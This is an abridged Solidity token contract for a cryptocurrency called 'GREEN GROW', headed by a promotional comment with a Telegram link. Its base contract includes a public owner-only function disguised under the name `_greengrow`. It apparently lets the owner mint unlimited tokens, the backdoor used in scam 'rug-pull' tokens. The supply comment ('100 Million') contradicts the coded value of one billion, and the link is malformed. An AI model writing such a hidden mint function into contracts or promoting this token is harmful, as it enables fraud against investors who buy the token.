...
//
// $GREENGROW proposes an innovative feature in its contract.
//
// 📱 Telegram:https::https://t.me/+DXXKcmOFE2Q2ZTBl
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _greengrow(uint256 amount) public onlyOwner {
    _greengrow(msg.sender, amount);
    }
    ...
    function _greengrow(address account, uint256 amount) internal virtual {
...
contract $GREENGROW is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("GREEN GROW", "GREENGROW") {
        _greengrow(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}